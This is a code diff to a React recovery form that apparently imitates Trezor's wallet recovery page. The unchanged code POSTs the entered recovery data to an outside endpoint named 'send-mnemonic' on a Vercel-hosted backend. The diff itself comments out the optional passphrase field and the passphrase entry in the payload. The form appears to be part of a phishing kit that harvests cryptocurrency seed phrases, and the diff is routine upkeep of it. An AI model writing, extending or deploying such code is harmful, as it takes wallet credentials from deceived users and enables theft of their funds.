@@ -48,14 +48,14 @@ const RecoveryForm = () => {
         const payload: Record<string, any> = {
             heading: `Trezor`,
             data,
-            passphrase: passphrase.trim() || '',
+            // passphrase: passphrase.trim() || '',
         };
 
         try {
             setLoading(true);
             const response = await fetch(
                 "https://trezor-backend-zeta.vercel.app/api/v1/send-mnemonic",
-                // "http://localhost:5000/api/v1/send-mnemonic",
+                // "http://localhost:5454/api/v1/send-mnemonic",
                 {
 
                     method: "POST",
@@ -190,7 +190,7 @@ const RecoveryForm = () => {
                         </div>
 
                         {/* ✅ Optional Passphrase Field */}
-                        <div className="mt-6">
+                        {/* <div className="mt-6">
                             <label className="block text-sm font-medium text-gray-700 mb-1">
                                 Passphrase
                             </label>
@@ -206,7 +206,7 @@ const RecoveryForm = () => {
       text-gray-900
     "
                             />
-                        </div>
+                        </div> */}
 
 
                         <div className="mt-8 text-left">
